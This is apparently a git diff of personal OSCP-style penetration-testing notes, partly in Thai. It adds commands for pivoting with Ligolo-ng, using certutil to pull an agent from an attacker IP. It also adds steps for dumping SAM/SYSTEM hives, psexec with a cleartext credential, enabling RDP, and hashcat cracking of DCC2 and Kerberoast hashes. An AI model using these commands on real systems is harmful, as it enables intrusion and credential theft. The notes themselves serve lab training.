@@ -32,34 +32,91 @@ mget *
 ## Pending - Command Sets / Steps
 
 <!-- Add new command sets below this line. -->
+## Pivot to Internal Network (Ligolo-ng)
+Setup Ligolo-ng บน Attacker Machine
+> Download: [https://github.com/Nicocha30/ligolo-ng/releases](https://github.com/Nicocha30/ligolo-ng/releases)
+```bash
+# If fail for interface exising, Clear routing cache
+sudo ip route flush cache
+# Delete old interface
+sudo ip link delete ligolo
+sudo ip link delete darlingleopardo
+--------------------------------
+# At Kali - For setup ligolo (can set with any priv user)
+# Create interface name 'ligolo'
+sudo ip tuntap add user salmonbara mode tun ligolo
+# set interface to up
+sudo ip link set ligolo up
+# start proxy
+sudo ./proxy -selfcert
 
+# Deploy Ligolo Agent
+# At Target download agent.exe from kali to 
+certutil.exe -urlcache -f http://192.168.45.178/ligolo/agent.exe \Users\Public\agent.exe
+# tun0 IP
+.\agent.exe -connect 192.168.45.178:11601 -ignore-cert
+
+# At kali, get session
+session
+
+# วิธีที่ 1: ใช้ autoroute (แนะนำ)
+autoroute
+    → เลือก subnet (e.g, 10.10.128.147/24)
+    → Create interface หรือ Use existing -> ligolo
+    → Start tunnel = Yes
+
+# วิธีที่ 2: Manual
+start  # เริ่ม tunnel
+ifconfig  # ดู internal IP
+# At kali, เพิ่ม route สำหรับ internal subnet
+sudo ip route add 10.10.79.0/24 dev ligolo
+
+# ถ้าหลังจาก route add แล้วขึ้น File exists ให้เช็คต่อไปนี้
+# เช็คว่า IP นี้ถูก route add แล้วหรือยัง
+ip route | grep 10.10.79
+# เช็คว่า packet จะออก interface ไหน
+ip route get 10.10.79.154
+```
+
+```
+Get-ChildItem C:\windows.old -Recurse -ErrorAction SilentlyContinue -Include *sam*
+Get-ChildItem C:\windows.old -Recurse -ErrorAction SilentlyContinue -Include *system*
+
+dir C:\windows.old\*sam* /s /b
+dir C:\windows.old\*system* /s /b
+
+download SAM
+download SYSTEM
+```
+
+Enable RDP service
+```powershell
+# remote using impacket-psexec
+impacket-psexec 'Eric.Wallows:EricLikesRunning800'@192.168.209.141
+# เปิด RDP (0 = allow RDP) (optional)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+# เปิด firewall rule สำหรับ RDP
+snetsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+# start RDP service
+sc start TermService
+# check port 3389
+netstat -ano | findstr 3389
+```
+
+crack DCC2 hash (long time)
+```sh
+# Crack admin account (DCC2 = mode 2100)
+echo '$DCC2$10240#offsec#a....57a' > offsec.hash
+hashcat -m 2100 offsec.hash /usr/share/wordlists/rockyou.txt
+```
+
+```sh
+impacket-GetUserSPNs 'OSCP.EXAM/Eric.Wallows:EricLikesRunning800' \
+  -dc-ip 10.10.128.146 -request
+  
+# Crack TGS ticket (hashcat mode 13100)
+echo '$krb5tgs$23$*sql_svc$OSCP.EXAM$OSCP.EXAM/sql_svc*$0176..' > sql_svc.hash
+hashcat -m 13100 sql_svc.hash /usr/share/wordlists/rockyou.txt
+```
 ## Moved
 
-### 2026-04-25
-
-- `impacket-ntlmrelayx -tf targets.txt -smb2support` -> `Active Directory/Initial_Access.md` under `NTLM Relay With SMB Signing Disabled`.
-- `impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>` -> `Active Directory/Lateral_Movement.md` under `WMI Exec With Password`.
-- Kerbrute password spray / bruteuser -> `Active Directory/Initial_Access.md` under `Kerbrute Password Attacks`.
-- BloodHound `--dns-tcp` fallback -> `Active Directory/Post_Creds_Enum.md` under `BloodHound Collection`.
-- SharpHound collector examples -> `Active Directory/Post_Creds_Enum.md` under `SharpHound Collection`.
-- Rubeus Kerberos examples -> `Active Directory/Post_Creds_Enum.md` under `Rubeus Kerberos Checks`.
-- PowerView domain enum examples -> `Active Directory/Post_Creds_Enum.md` under `PowerView`.
-- LDAP search with valid creds -> `Active Directory/Post_Creds_Enum.md` under `LDAP Search With Credentials`.
-- NetExec `gpp_password` and `spider_plus` modules -> `Active Directory/Post_Creds_Enum.md` / `Enumeration/Services/135, 445 - SMB.md`.
-- BloodHound Cypher queries -> `Active Directory/Bloodhound/BloodHound Analysis.md` under `Cypher Queries`.
-- Responder run modes, log review, and NetNTLMv2 cracking -> `Active Directory/Initial_Access.md` under `Responder Net-NTLMv2 Capture`.
-- Authenticated `rpcclient` commands and enum4linux-ng -> `Enumeration/Services/135, 445 - SMB.md`.
-- FTP anonymous mirror with `wget -m` -> `Enumeration/Services/21 - FTP.md` under `Anonymous / Default Checks`.
-- Web vhost, dirsearch, Nikto, Nuclei, WhatWeb/Wappalyzer, WPScan, and CeWL items -> `Enumeration/Web.md`, `Initial Access/Online Password Attacks.md`, and `Initial Access/Password Guessing.md`.
-- PDF metadata extraction with `exiftool` -> `Enumeration/Web.md` under `Metadata Extraction`.
-- Hydra service, HTTP GET, HTTP POST, and HTTPS POST examples -> `Initial Access/Online Password Attacks.md`.
-- Hash identifier and online crack references -> `Credentials/Hash Crack.md`.
-- Metasploit useful modules and MSFvenom payload generation -> `Payloads/Reverse Shells.md`.
-- Searchsploit workflow -> `Exploitation/Web Payloads.md` under `Exploit Research`.
-- WinPEAS, PowerUp, Seatbelt, and accesschk review -> `Privilege Escalation/Windows Privilege Escalation.md`.
-- PrintSpoofer / GodPotato / JuicyPotato examples -> `Privilege Escalation/Windows Privilege Escalation.md` and `Tools/Potato Family.md`.
-- LinPEAS and pspy -> `Privilege Escalation/Linux Privilege Escalation.md` under `Automated Audit Scripts`.
-- Socat and Chisel tunnel helpers -> `Pivoting/Tunnelling.md`.
-- Windows `nc.exe` / `ncat.exe` usage -> `Post-Exploitation/File Transfer.md`.
-- OSCP proof and tree helpers -> `Post-Exploitation/Linux Post-Exploitation.md` and `Post-Exploitation/Windows Post-Exploitation.md`.
-- Skipped exact duplicates already present: AS-REP roast, Kerberoast, Kerbrute userenum, basic Evil-WinRM, core hydra SSH/FTP/SMB/RDP/WinRM, Mimikatz LSASS/SAM/DCSync basics, and existing Chisel snippets.
